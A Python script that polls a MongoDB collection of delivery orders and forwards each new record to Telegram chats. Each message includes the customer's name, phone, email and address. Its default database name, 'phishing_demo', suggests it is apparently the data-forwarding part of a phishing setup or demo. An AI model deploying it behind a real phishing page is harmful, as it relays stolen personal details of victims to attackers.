import os
import time
from datetime import datetime, timezone
from pymongo import MongoClient
from telegram import Bot
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
CHAT_IDS = [x.strip() for x in os.getenv("CHAT_IDS", "").split(",") if x.strip()]
DATABASE_URL = os.getenv("DATABASE_URL", "").strip()
DB_NAME = os.getenv("DB_NAME", "phishing_demo").strip()  # default to your db name in the URL
COLLECTION = os.getenv("ORDERS_COLLECTION", "orders").strip()
POLL_SECONDS = int(os.getenv("POLL_SECONDS", "10"))

if not BOT_TOKEN or not CHAT_IDS or not DATABASE_URL:
    raise SystemExit("Missing env. Set BOT_TOKEN, CHAT_IDS, DATABASE_URL")

bot = Bot(token=BOT_TOKEN)
client = MongoClient(DATABASE_URL)
db = client.get_default_database() or client[DB_NAME]
orders = db[COLLECTION]

def fmt_order(o: dict) -> str:
    created = o.get("createdAt")
    if isinstance(created, datetime):
        created_s = created.astimezone(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    else:
        created_s = str(created)
    tg = o.get("telegram") or ""
    if tg:
        tg = "@" + str(tg).lstrip("@")
    return (
        "🆕 New delivery order\n"
        f"ID: {o.get('_id')}\n"
        f"Product: {o.get('productTitle')} (€ {o.get('productPrice')})\n"
        f"Customer: {o.get('customerName')}\n"
        f"Phone: {o.get('phone')}\n"
        f"Email: {o.get('email')}\n"
        f"Telegram: {tg or '-'}\n"
        f"Delivery date: {o.get('deliveryDate')}\n"
        f"Address: {o.get('addressLine1')}{(', ' + o.get('addressLine2')) if o.get('addressLine2') else ''}\n"
        f"City/Country/ZIP: {', '.join([x for x in [o.get('city'), o.get('country'), o.get('postalCode')] if x])}\n"
        f"Notes: {o.get('notes') or '-'}\n"
        f"Created: {created_s}"
    )

def send_all(text: str):
    for cid in CHAT_IDS:
        bot.send_message(chat_id=cid, text=text)

def main():
    # start from now
    last = datetime.now(timezone.utc)
    print("Bot started, watching for new orders…")
    while True:
        try:
            cursor = orders.find({"createdAt": {"$gt": last}}).sort("createdAt", 1)
            for o in cursor:
                created = o.get("createdAt")
                if isinstance(created, datetime) and created > last:
                    last = created
                send_all(fmt_order(o))
        except Exception as e:
            print("Error:", e)
        time.sleep(POLL_SECONDS)

if __name__ == "__main__":
    main()
